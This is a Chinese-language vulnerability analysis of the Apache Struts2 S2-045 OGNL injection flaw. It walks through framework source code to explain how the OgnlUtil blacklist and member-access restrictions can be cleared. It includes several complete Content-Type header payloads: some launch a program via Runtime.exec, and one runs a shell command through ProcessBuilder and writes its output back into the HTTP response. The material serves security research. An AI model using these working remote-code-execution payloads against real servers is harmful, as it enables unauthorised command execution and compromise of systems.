# S2-045分析

在这个当中又将struts当中ognl的执行提升到一个新难度，但是前辈们还是很厉害也是成功进行了绕过，首先要知道有些什么变动

首先_memberAccess没了，因此我们不能再使用 `#_memberAccess` 来访问 ValueStack 中的 SecurityMemberAccess 对象

```java
public Object get(Object key) {
  Object result;
  if (RESERVED_KEYS.containsKey(key)) {
    if (key.equals("this")) {
      result = this.getCurrentObject();
    } else if (key.equals("root")) {
      result = this.getRoot();
    } else if (key.equals("context")) {
      result = this;
    } else if (key.equals("_traceEvaluations")) {
      result = this.getTraceEvaluations() ? Boolean.TRUE : Boolean.FALSE;
    } else if (key.equals("_lastEvaluation")) {
      result = this.getLastEvaluation();
    } else if (key.equals("_keepLastEvaluation")) {
      result = this.getKeepLastEvaluation() ? Boolean.TRUE : Boolean.FALSE;
    } else if (key.equals("_classResolver")) {
      result = this.getClassResolver();
    } else {
      if (!key.equals("_typeConverter")) {
        throw new IllegalArgumentException("unknown reserved key '" + key + "'");
      }

      result = this.getTypeConverter();
    }
  } else {
    result = this._values.get(key);
  }

  return result;
}
```

同时在struts-default.xml当中黑名单又添加了 ognl.MemberAccess 和 ognl.DefaultMemberAccess 类

```java
<constant name="struts.excludedClasses"
              value="
                java.lang.Object,
                java.lang.Runtime,
                java.lang.System,
                java.lang.Class,
                java.lang.ClassLoader,
                java.lang.Shutdown,
                java.lang.ProcessBuilder,
                ognl.OgnlContext,
                ognl.ClassResolver,
                ognl.TypeConverter,
                ognl.MemberAccess,
                ognl.DefaultMemberAccess,
                com.opensymphony.xwork2.ognl.SecurityMemberAccess,
                com.opensymphony.xwork2.ActionContext" />

    <!-- this must be valid regex, each '.' in package name must be escaped! -->
    <!-- it's more flexible but slower than simple string comparison -->
    <!-- constant name="struts.excludedPackageNamePatterns" value="^java\.lang\..*,^ognl.*,^(?!javax\.servlet\..+)(javax\..+)" / -->

    <!-- this is simpler version of the above used with string comparison -->
    <constant name="struts.excludedPackageNames" value="java.lang.,ognl,javax,freemarker.core,freemarker.template" />
```

因此之前的S2-032的payload也因此不能用了

拿到网上的payload我们进行分析

```http
Content-Type: %{(#yyds='multipart/form-data').(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('open -na Calculator'))}
```

第一个是因为要求需要包含 "multipart/form-data"，但不以" multipart/" 开头，进入后面container部分

在创建根对象时调用com.opensymphony.xwork2.ognl.OgnlValueStackFactory#createValueStack

```java
public ValueStack createValueStack() {
  ValueStack stack = new OgnlValueStack(this.xworkConverter, this.compoundRootAccessor, this.textProvider, this.allowStaticMethodAccess);
  this.container.inject(stack);
  stack.getContext().put("com.opensymphony.xwork2.ActionContext.container", this.container);
  return stack;
}
```

在创建这个根对象的时候，会调用 setRoot 方法初始化它的各种属性

```java
protected void setRoot(XWorkConverter xworkConverter, CompoundRootAccessor accessor, CompoundRoot compoundRoot, boolean allowStaticMethodAccess) {
  this.root = compoundRoot;
  this.securityMemberAccess = new SecurityMemberAccess(allowStaticMethodAccess);
  this.context = Ognl.createDefaultContext(this.root, accessor, new OgnlTypeConverterWrapper(xworkConverter), this.securityMemberAccess);
  this.context.put("com.opensymphony.xwork2.util.ValueStack.ValueStack", this);
  Ognl.setClassResolver(this.context, accessor);
  ((OgnlContext)this.context).setTraceEvaluations(false);
  ((OgnlContext)this.context).setKeepLastEvaluation(false);
}
```

而这个securityMemberAccess也通过Ognl.createDefaultContext设置到了OgnlContext，因此我们要想更改 OgnlValueStack.securityMemberAccess，其实就可以直接修改OgnlContext._memberAccess即可

```java
public static Map addDefaultContext(Object root, ClassResolver classResolver, TypeConverter converter, MemberAccess memberAccess, Map context) {
  OgnlContext result;
  if (!(context instanceof OgnlContext)) {
    result = new OgnlContext();
    result.setValues(context);
  } else {
    result = (OgnlContext)context;
  }

  if (classResolver != null) {
    result.setClassResolver(classResolver);
  }

  if (converter != null) {
    result.setTypeConverter(converter);
  }

  if (memberAccess != null) {
    result.setMemberAccess(memberAccess);
  }

  result.setRoot(root);
  return result;
}

public void setMemberAccess(MemberAccess value) {
  if (value == null) {
    throw new IllegalArgumentException("cannot set MemberAccess to null");
  } else {
    this._memberAccess = value;
  }
}
```

之后通过container 进行对象的注入，并将 container 放入 context 中，在这个过程当中也将黑名单通过com.opensymphony.xwork2.ognl.OgnlValueStack#setOgnlUtil加载进去，而且`OgnlContext`中，同时可以看到`this.ognlUtil = ognlUtil`为对象的引用，因此全局也都共享一个实例

```java
@Inject
public void setOgnlUtil(OgnlUtil ognlUtil) {
  this.ognlUtil = ognlUtil;
  this.securityMemberAccess.setExcludedClasses(ognlUtil.getExcludedClasses());
  this.securityMemberAccess.setExcludedPackageNamePatterns(ognlUtil.getExcludedPackageNamePatterns());
  this.securityMemberAccess.setExcludedPackageNames(ognlUtil.getExcludedPackageNames());
}
```

因此payload的获取也很明确了

获得 Container 对象后，使用 `getInstance()` 方法获取之前注入的OgnlUtil对象，而通过这个OgnlUtil工具类我们就可以清除SecurityMemberAccess当中的一些限制性属性，从而实现绕过限制执行命令

有回显

```http
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

当然也不一定非要用clear方法，毕竟这些属性都有set方法

```java
%{(#yyds='multipart/form-data').(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses='').(#ognlUtil.excludedPackageNames='').(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('open -na Calculator'))}
```
